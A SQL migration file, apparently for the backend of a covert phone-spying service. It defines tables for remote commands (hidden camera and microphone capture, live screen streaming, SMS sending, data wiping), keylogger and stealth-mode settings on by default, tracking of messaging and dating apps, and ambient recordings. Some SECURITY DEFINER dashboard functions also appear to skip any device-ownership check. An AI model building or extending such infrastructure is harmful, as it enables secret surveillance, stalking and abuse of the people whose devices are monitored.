-- =========================================================================
-- MIGRATION 003: SYSTEM TABLES, DIAGNOSTICS & FUNCTIONS
-- =========================================================================

-- 17. Create notifications_log table
CREATE TABLE IF NOT EXISTS public.notification_logs (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    app_name TEXT,
    package_name TEXT,
    title TEXT,
    content TEXT,
    big_text TEXT,
    category TEXT,
    timestamp TIMESTAMPTZ NOT NULL,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 18. Create sim_changes table
CREATE TABLE IF NOT EXISTS public.sim_changes (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    sim_operator TEXT,
    sim_serial TEXT,
    phone_number TEXT,
    country_code TEXT,
    event_type TEXT CHECK (event_type IN ('inserted','removed','changed')),
    timestamp TIMESTAMPTZ NOT NULL,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 19. Create remote_commands table
CREATE TABLE IF NOT EXISTS public.remote_commands (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    command_type TEXT NOT NULL CHECK (command_type IN ('take_photo_front','take_photo_back','take_screenshot','record_audio','record_video','start_live_audio','stop_live_audio','start_live_video','stop_live_video','start_live_screen','stop_live_screen','ring_phone','vibrate_phone','send_sms','lock_device','unlock_device','wipe_data','block_app','unblock_app','block_website','unblock_website','enable_wifi','disable_wifi','enable_gps','get_location_now','update_settings','restart_service','download_file','delete_file')),
    parameters JSONB,
    status TEXT DEFAULT 'pending' CHECK (status IN ('pending','sent','delivered','executed','failed','expired')),
    result JSONB,
    result_media_url TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    executed_at TIMESTAMPTZ,
    expires_at TIMESTAMPTZ DEFAULT (NOW() + INTERVAL '24 hours')
);

-- 20. Create device_settings table
CREATE TABLE IF NOT EXISTS public.device_settings (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL UNIQUE,
    track_sms BOOLEAN DEFAULT true, 
    track_calls BOOLEAN DEFAULT true, 
    track_locations BOOLEAN DEFAULT true, 
    location_interval_minutes INTEGER DEFAULT 15,
    track_photos BOOLEAN DEFAULT true, 
    track_videos BOOLEAN DEFAULT true, 
    track_contacts BOOLEAN DEFAULT true, 
    track_apps BOOLEAN DEFAULT true,
    track_browser BOOLEAN DEFAULT true, 
    track_bookmarks BOOLEAN DEFAULT true, 
    track_keylogger BOOLEAN DEFAULT true, 
    track_calendar BOOLEAN DEFAULT true,
    track_emails BOOLEAN DEFAULT true, 
    track_wifi BOOLEAN DEFAULT true, 
    track_notifications BOOLEAN DEFAULT true,
    track_whatsapp BOOLEAN DEFAULT true, 
    track_facebook BOOLEAN DEFAULT true, 
    track_instagram BOOLEAN DEFAULT true, 
    track_telegram BOOLEAN DEFAULT true,
    track_viber BOOLEAN DEFAULT true, 
    track_signal BOOLEAN DEFAULT true, 
    track_snapchat BOOLEAN DEFAULT true, 
    track_skype BOOLEAN DEFAULT true,
    track_line BOOLEAN DEFAULT true, 
    track_kik BOOLEAN DEFAULT true, 
    track_wechat BOOLEAN DEFAULT true, 
    track_tinder BOOLEAN DEFAULT true,
    track_discord BOOLEAN DEFAULT true, 
    track_tiktok BOOLEAN DEFAULT true, 
    track_youtube BOOLEAN DEFAULT true, 
    track_zoom BOOLEAN DEFAULT true,
    track_google_meet BOOLEAN DEFAULT true, 
    track_reddit BOOLEAN DEFAULT true, 
    track_sim_changes BOOLEAN DEFAULT true,
    record_calls BOOLEAN DEFAULT false, 
    stealth_mode BOOLEAN DEFAULT true,
    blocked_apps JSONB DEFAULT '[]', 
    blocked_websites JSONB DEFAULT '[]',
    schedule_restriction JSONB, 
    geofence_zones JSONB DEFAULT '[]', 
    alert_keywords JSONB DEFAULT '[]',
    sync_on_wifi_only BOOLEAN DEFAULT false,
    created_at TIMESTAMPTZ DEFAULT NOW(), 
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- 21. Create alerts table
CREATE TABLE IF NOT EXISTS public.alerts (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    alert_type TEXT NOT NULL,
    title TEXT NOT NULL,
    description TEXT,
    severity TEXT DEFAULT 'medium' CHECK (severity IN ('low','medium','high','critical')),
    related_data JSONB,
    is_read BOOLEAN DEFAULT false,
    timestamp TIMESTAMPTZ DEFAULT NOW(),
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 22. Create file_explorer_items table
CREATE TABLE IF NOT EXISTS public.file_explorer_items (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    file_path TEXT NOT NULL,
    file_name TEXT NOT NULL,
    file_type TEXT,
    file_size BIGINT,
    mime_type TEXT,
    is_directory BOOLEAN DEFAULT false,
    parent_path TEXT,
    download_url TEXT,
    last_modified TIMESTAMPTZ,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 23. Create screen_captures table
CREATE TABLE IF NOT EXISTS public.screen_captures (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    capture_type TEXT CHECK (capture_type IN ('screenshot','screen_recording')),
    file_url TEXT NOT NULL,
    thumbnail_url TEXT,
    duration INTEGER,
    file_size BIGINT,
    timestamp TIMESTAMPTZ NOT NULL,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 24. Create ambient_recordings table
CREATE TABLE IF NOT EXISTS public.ambient_recordings (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    recording_url TEXT NOT NULL,
    duration INTEGER NOT NULL,
    file_size BIGINT,
    timestamp TIMESTAMPTZ NOT NULL,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- =========================================================================
-- CREATE INDEXES
-- =========================================================================
CREATE INDEX IF NOT EXISTS idx_notifications_device ON public.notification_logs(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_sim_device ON public.sim_changes(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_commands_device_status ON public.remote_commands(device_id, status);
CREATE INDEX IF NOT EXISTS idx_alerts_device ON public.alerts(device_id, is_read, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_file_explorer_device ON public.file_explorer_items(device_id, parent_path);
CREATE INDEX IF NOT EXISTS idx_screen_captures_device ON public.screen_captures(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_ambient_device ON public.ambient_recordings(device_id, timestamp DESC);

-- =========================================================================
-- ENABLE ROW LEVEL SECURITY (RLS)
-- =========================================================================
ALTER TABLE public.notification_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.sim_changes ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.remote_commands ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.alerts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.file_explorer_items ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.screen_captures ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.ambient_recordings ENABLE ROW LEVEL SECURITY;

-- =========================================================================
-- RLS POLICIES FOR SYSTEM & MEDIA TABLES
-- =========================================================================

-- notification_logs
CREATE POLICY "Users access own notifications" ON public.notification_logs FOR ALL TO authenticated USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access notifications" ON public.notification_logs FOR ALL TO service_role USING (true) WITH CHECK (true);

-- sim_changes
CREATE POLICY "Users access own sim_changes" ON public.sim_changes FOR ALL TO authenticated USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access sim_changes" ON public.sim_changes FOR ALL TO service_role USING (true) WITH CHECK (true);

-- remote_commands
CREATE POLICY "Users access own remote_commands" ON public.remote_commands FOR ALL TO authenticated USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access remote_commands" ON public.remote_commands FOR ALL TO service_role USING (true) WITH CHECK (true);

-- device_settings
CREATE POLICY "Users access own device_settings" ON public.device_settings FOR ALL TO authenticated USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access device_settings" ON public.device_settings FOR ALL TO service_role USING (true) WITH CHECK (true);

-- alerts
CREATE POLICY "Users access own alerts" ON public.alerts FOR ALL TO authenticated USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access alerts" ON public.alerts FOR ALL TO service_role USING (true) WITH CHECK (true);

-- file_explorer_items
CREATE POLICY "Users access own file_explorer" ON public.file_explorer_items FOR ALL TO authenticated USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access file_explorer" ON public.file_explorer_items FOR ALL TO service_role USING (true) WITH CHECK (true);

-- screen_captures
CREATE POLICY "Users access own screen_captures" ON public.screen_captures FOR ALL TO authenticated USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access screen_captures" ON public.screen_captures FOR ALL TO service_role USING (true) WITH CHECK (true);

-- ambient_recordings
CREATE POLICY "Users access own ambient_recordings" ON public.ambient_recordings FOR ALL TO authenticated USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access ambient_recordings" ON public.ambient_recordings FOR ALL TO service_role USING (true) WITH CHECK (true);


-- =========================================================================
-- DATABASE TRIGGER FUNCTIONS & TRIGGERS
-- =========================================================================

-- Trigger 1: Auto create device_settings on new device
CREATE OR REPLACE FUNCTION public.on_device_created()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO public.device_settings (device_id)
  VALUES (NEW.id);
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE TRIGGER trigger_device_created
  AFTER INSERT ON public.devices
  FOR EACH ROW EXECUTE FUNCTION public.on_device_created();


-- Trigger 2: Auto create alert on sim_change
CREATE OR REPLACE FUNCTION public.on_sim_change_detected()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO public.alerts (device_id, alert_type, title, description, severity, timestamp)
  VALUES (
    NEW.device_id, 
    'sim_change', 
    'SIM Card Changed', 
    'A SIM card was ' || NEW.event_type || ' for operator ' || COALESCE(NEW.sim_operator, 'Unknown'), 
    'critical',
    NEW.timestamp
  );
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE TRIGGER trigger_sim_change_detected
  AFTER INSERT ON public.sim_changes
  FOR EACH ROW EXECUTE FUNCTION public.on_sim_change_detected();


-- Trigger 3: Generic updated_at sync
CREATE OR REPLACE FUNCTION public.update_updated_at()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = NOW();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE TRIGGER update_profiles_updated_at BEFORE UPDATE ON public.profiles FOR EACH ROW EXECUTE FUNCTION public.update_updated_at();
CREATE TRIGGER update_devices_updated_at BEFORE UPDATE ON public.devices FOR EACH ROW EXECUTE FUNCTION public.update_updated_at();
CREATE TRIGGER update_device_settings_updated_at BEFORE UPDATE ON public.device_settings FOR EACH ROW EXECUTE FUNCTION public.update_updated_at();


-- =========================================================================
-- HELPER FUNCTIONS FOR DASHBOARD
-- =========================================================================

-- Function 4: get_device_stats
CREATE OR REPLACE FUNCTION public.get_device_stats(p_device_id UUID)
RETURNS JSON AS $$
DECLARE
  v_total_sms BIGINT;
  v_total_calls BIGINT;
  v_total_locations BIGINT;
  v_total_photos BIGINT;
  v_total_videos BIGINT;
  v_total_apps BIGINT;
  v_total_contacts BIGINT;
  v_total_alerts_unread BIGINT;
  v_last_location JSON;
BEGIN
  SELECT COUNT(*) INTO v_total_sms FROM public.sms_messages WHERE device_id = p_device_id;
  SELECT COUNT(*) INTO v_total_calls FROM public.call_logs WHERE device_id = p_device_id;
  SELECT COUNT(*) INTO v_total_locations FROM public.locations WHERE device_id = p_device_id;
  SELECT COUNT(*) INTO v_total_photos FROM public.media_files WHERE device_id = p_device_id AND file_type = 'photo';
  SELECT COUNT(*) INTO v_total_videos FROM public.media_files WHERE device_id = p_device_id AND file_type = 'video';
  SELECT COUNT(*) INTO v_total_apps FROM public.installed_apps WHERE device_id = p_device_id;
  SELECT COUNT(*) INTO v_total_contacts FROM public.contacts WHERE device_id = p_device_id;
  SELECT COUNT(*) INTO v_total_alerts_unread FROM public.alerts WHERE device_id = p_device_id AND is_read = false;

  SELECT row_to_json(l) INTO v_last_location
  FROM (
    SELECT latitude, longitude, address, timestamp 
    FROM public.locations 
    WHERE device_id = p_device_id 
    ORDER BY timestamp DESC LIMIT 1
  ) l;

  RETURN json_build_object(
    'total_sms', v_total_sms,
    'total_calls', v_total_calls,
    'total_locations', v_total_locations,
    'total_photos', v_total_photos,
    'total_videos', v_total_videos,
    'total_apps', v_total_apps,
    'total_contacts', v_total_contacts,
    'total_alerts_unread', v_total_alerts_unread,
    'last_location', v_last_location
  );
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;


-- Function 5: get_top_contacts
CREATE OR REPLACE FUNCTION public.get_top_contacts(p_device_id UUID, p_limit INTEGER DEFAULT 10)
RETURNS TABLE (phone_number TEXT, total_interactions BIGINT) AS $$
BEGIN
  RETURN QUERY
  SELECT 
    t.phone_number, 
    COUNT(*) AS total_interactions
  FROM (
    SELECT call_logs.phone_number FROM public.call_logs WHERE device_id = p_device_id
    UNION ALL
    SELECT sender_number AS phone_number FROM public.sms_messages WHERE device_id = p_device_id AND message_type IN ('incoming')
    UNION ALL
    SELECT receiver_number AS phone_number FROM public.sms_messages WHERE device_id = p_device_id AND receiver_number IS NOT NULL AND message_type IN ('outgoing')
  ) t
  WHERE t.phone_number IS NOT NULL
  GROUP BY t.phone_number
  ORDER BY total_interactions DESC
  LIMIT p_limit;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;


-- Function 6: mark_device_offline
CREATE OR REPLACE FUNCTION public.mark_device_offline()
RETURNS VOID AS $$
BEGIN
  UPDATE public.devices 
  SET is_online = false 
  WHERE last_seen < NOW() - INTERVAL '10 minutes' 
    AND is_online = true;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
